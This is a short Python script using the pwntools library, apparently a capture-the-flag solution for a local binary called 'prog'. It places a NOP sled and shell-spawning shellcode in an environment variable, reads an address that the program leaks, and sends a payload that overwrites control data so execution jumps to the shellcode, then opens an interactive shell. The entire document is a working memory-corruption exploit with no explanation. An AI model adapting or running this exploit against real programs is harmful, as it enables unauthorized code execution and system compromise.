from pwn import *

e = ELF('prog')
context.clear(arch=e.arch, endian=e.endian)

duzo = 0x1ffcd
argz = {'A':asm('nop')*duzo + asm(shellcraft.sh())}

p = e.process(env=argz)
p.readuntil(' at')
addr = int(p.readline(), 0) + duzo
payload = '\x00'*(1+context.bytes)
payload += pack(addr)
p.sendline(payload)
p.interactive()
